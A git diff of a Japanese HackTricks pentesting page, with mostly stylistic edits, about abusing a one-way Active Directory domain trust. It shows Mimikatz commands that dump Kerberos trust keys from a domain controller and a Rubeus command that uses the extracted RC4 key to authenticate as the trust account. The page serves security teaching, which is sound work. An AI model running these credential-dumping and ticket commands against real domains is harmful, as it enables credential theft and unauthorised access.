@@ -9,8 +9,8 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
@@ -49,15 +49,15 @@ MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=F
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
 ```
-この抽出は、名前の後に**$**が付いたアカウントがアクティブであり、ドメイン**A**の「Domain Users」グループに属しているため、これに関連する権限を継承しているため可能です。これにより、個人はこのアカウントの資格情報を使用してドメイン**A**に対して認証することができます。
+この抽出は、名前の後に **$** が付いたアカウントがアクティブであり、ドメイン **A** の「Domain Users」グループに属しているため、これに関連する権限を継承しているため可能です。これにより、個人はこのアカウントの資格情報を使用してドメイン **A** に対して認証することができます。
 
-**警告:** この状況を利用して、ユーザーとしてドメイン**A**に足場を築くことは可能ですが、権限は限られています。しかし、このアクセスはドメイン**A**での列挙を行うには十分です。
+**警告:** この状況を利用して、ユーザーとしてドメイン **A** に足場を築くことは可能ですが、権限は限られています。しかし、このアクセスはドメイン **A** での列挙を行うには十分です。
 
-`ext.local`が信頼するドメインで、`root.local`が信頼されたドメインであるシナリオでは、`root.local`内に`EXT$`という名前のユーザーアカウントが作成されます。特定のツールを使用することで、Kerberos信頼キーをダンプし、`root.local`内の`EXT$`の資格情報を明らかにすることが可能です。これを達成するためのコマンドは次のとおりです:
+`ext.local` が信頼するドメインで、`root.local` が信頼されたドメインであるシナリオでは、`root.local` 内に `EXT$` という名前のユーザーアカウントが作成されます。特定のツールを使用することで、Kerberos 信頼キーをダンプし、`root.local` 内の `EXT$` の資格情報を明らかにすることが可能です。これを達成するためのコマンドは次のとおりです:
 ```bash
 lsadump::trust /patch
 ```
-これに続いて、抽出したRC4キーを使用して、別のツールコマンドを使用して`root.local`内の`root.local\EXT$`として認証することができます:
+以下に従って、抽出したRC4キーを使用して、別のツールコマンドを使用して`root.local`内の`root.local\EXT$`として認証することができます：
 ```bash
 .\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
 ```
